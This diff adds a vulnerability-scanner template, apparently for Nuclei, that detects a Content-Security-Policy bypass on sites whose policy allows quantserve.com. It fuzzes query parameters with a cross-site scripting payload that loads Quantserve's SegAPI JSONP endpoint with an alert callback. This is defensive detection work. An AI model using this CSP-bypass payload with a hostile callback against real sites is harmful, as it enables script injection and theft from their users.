@@ -1,0 +1,55 @@
+id: quantserve-segapi-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Quantserve SegAPI
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,quantserve-segapi
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "quantserve.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: quantserve_segapi_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://segapi.quantserve.com/api/segments.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "quantserve_segapi_csp_xss == true"
+# digest: 4a0a00473045022072501fa9b07ca9bb5905eb4ae34a1be30f077384b177ce3ae6aeb77adf890808022100e5701250fe23d4b156ee749a99c6d82d687e46e9f853d826f4e0732ae0bfdc59:922c64590222798bb761d5b6d8e72950
